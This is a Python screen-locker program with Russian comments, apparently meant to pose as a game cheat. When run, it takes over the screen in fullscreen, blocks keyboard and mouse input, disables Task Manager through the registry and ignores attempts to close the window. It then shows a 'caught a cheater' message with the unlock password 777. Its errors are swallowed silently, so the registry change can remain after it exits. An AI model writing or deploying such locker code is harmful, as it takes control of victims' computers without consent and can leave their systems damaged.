import tkinter as tk
from tkinter import messagebox
import ctypes
import sys

class CheaterLocker:
    def __init__(self):
        self.root = tk.Tk()
        
        # Полноэкранный режим без возможности выхода
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        
        # Блокировка Alt+Tab, Win и других комбинаций
        self.block_keyboard_shortcuts()
        
        # Блокировка диспетчера задач
        self.block_task_manager()
        
        # Основной интерфейс
        frame = tk.Frame(self.root)
        frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # Заголовок "Попался читер!"
        tk.Label(frame, text="Попался читер!", 
                font=("Arial", 24, "bold")).pack(pady=20)
        
        # Сообщение о пароле по центру
        tk.Label(frame, 
                text="Пароль: 777\nБольше не скачивайте странные ресурсы с интернета",
                font=("Arial", 16),
                fg="red").pack(pady=20)
        
        # Поле для ввода пароля
        self.entry = tk.Entry(frame, show="*", font=("Arial", 18))
        self.entry.pack(pady=20)
        
        # Кнопка разблокировки
        tk.Button(frame, text="Разблокировать", 
                 command=self.check_password,
                 font=("Arial", 14),
                 bg="#4CAF50",
                 fg="white").pack(pady=10)
        
        # Блокировка закрытия окна
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind("<Alt-F4>", self.do_nothing)
        self.root.bind("<Control-Alt-Delete>", self.do_nothing)
        
        # Секретный выход (Ctrl+Alt+Shift+Q)
        self.root.bind("<Control-Alt-Shift-q>", self.emergency_exit)
        
        self.root.mainloop()
    
    def check_password(self):
        if self.entry.get() == "777":
            self.restore_system()
            messagebox.showinfo("Внимание", "Не используй больше читы!")
            self.root.destroy()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль!")
    
    def emergency_exit(self, event):
        self.restore_system()
        self.root.destroy()
    
    def do_nothing(self, event=None):
        pass
    
    def block_keyboard_shortcuts(self):
        try:
            ctypes.windll.user32.BlockInput(True)
        except:
            pass
    
    def block_task_manager(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def restore_system(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            ctypes.windll.user32.BlockInput(False)
        except:
            pass

if __name__ == "__main__":
    print("Для выхода используйте Ctrl+Alt+Shift+Q")
    CheaterLocker()